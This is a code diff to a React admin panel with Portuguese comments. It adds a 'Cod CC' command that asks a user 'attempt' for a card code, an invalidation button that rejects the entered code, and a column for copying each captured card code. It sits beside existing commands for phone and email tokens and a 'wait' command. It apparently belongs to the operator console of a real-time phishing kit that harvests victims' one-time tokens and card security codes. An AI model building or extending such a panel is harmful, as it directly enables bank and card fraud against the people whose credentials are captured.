@@ -267,15 +267,15 @@ function AdminPanel() {
         payload.redirect_url = redirectUrl;
       }
       
-      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL)
-      if (command === "TOK-TEL" || command === "TOK-MAIL") {
+      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL, COD-CC)
+      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
         payload.reference = referenceField;
       }
 
       await axios.post(`${API}/admin/command`, payload, { headers });
       
       // Limpar campo de referência após enviar comando que usa ele
-      if (command === "TOK-TEL" || command === "TOK-MAIL") {
+      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
         setReferenceField("");
       }
       
@@ -303,15 +303,15 @@ function AdminPanel() {
         command: command + "-INV",  // Adiciona sufixo para indicar invalidação
       };
       
-      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL)
-      if (command === "TOK-TEL" || command === "TOK-MAIL") {
+      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL, COD-CC)
+      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
         payload.reference = referenceField;
       }
       
       await axios.post(`${API}/admin/command`, payload, { headers });
       
       // Limpar campo de referência após enviar comando que usa ele
-      if (command === "TOK-TEL" || command === "TOK-MAIL") {
+      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
         setReferenceField("");
       }
       
@@ -690,6 +690,24 @@ function AdminPanel() {
                               </div>
                             </div>
                           </th>
+                          <th className="border border-[#2a2a2a] p-0">
+                            <div className="flex">
+                              <div 
+                                onClick={() => sendCommand(attempt.id, "COD-CC")}
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-yellow-900/30 transition-colors flex-1"
+                                title="Clique para pedir código do cartão"
+                              >
+                                Cod CC
+                              </div>
+                              <div 
+                                onClick={() => sendInvalidCommand(attempt.id, "COD-CC")}
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
+                                title="Invalidar código do cartão"
+                              >
+                                X
+                              </div>
+                            </div>
+                          </th>
                           <th 
                             onClick={() => sendCommand(attempt.id, "AGUARDE")}
                             className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-yellow-900/30 transition-colors"
@@ -826,6 +844,17 @@ function AdminPanel() {
                             )}
                           </td>
 
+                          {/* Cod CC - código do cartão */}
+                          <td 
+                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
+                            onClick={() => copyToClipboard(attempt.cc_code, `cccode-${attempt.id}`)}
+                            title="Clique para copiar"
+                          >
+                            <span className={copiedField === `cccode-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
+                              {copiedField === `cccode-${attempt.id}` ? "Copiado!" : (attempt.cc_code || "-")}
+                            </span>
+                          </td>
+
                           {/* 👍 - apenas header, célula vazia */}
                           <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                             <span className="text-gray-600">-</span>
@@ -875,6 +904,7 @@ function AdminPanel() {
                             <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                             <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                             <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
+                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                             <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                             <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                             <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
